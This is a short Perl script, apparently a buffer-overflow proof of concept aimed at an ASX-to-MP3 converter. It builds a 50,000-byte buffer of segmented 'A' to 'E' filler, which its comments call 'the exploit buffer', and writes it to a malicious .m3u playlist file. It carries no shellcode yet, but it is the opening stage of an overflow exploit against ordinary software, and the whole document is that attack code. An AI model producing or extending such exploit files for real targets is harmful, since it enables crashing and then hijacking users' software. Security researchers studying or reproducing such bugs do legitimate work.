#!/usr/bin/perl

my $buffsize = 50000; # sets buffer size for consistent sized payload
my $As = "\x41" x ($buffsize / 5);
my $Bs = "\x42" x ($buffsize / 5);
my $Cs = "\x43" x ($buffsize / 5);
my $Ds = "\x44" x ($buffsize / 5);
my $Es = "\x45" x ($buffsize / 5);

my $buffer = $As.$Bs.$Cs.$Ds.$Es; # build the exploit buffer

# write the exploit buffer to file
my $file = "asx2mp3.m3u";
open(FILE, ">$file");
print FILE $buffer;
close(FILE);
print "Exploit file created [" . $file . "]\n";
print "Buffer size: " . length($buffer). "\n";
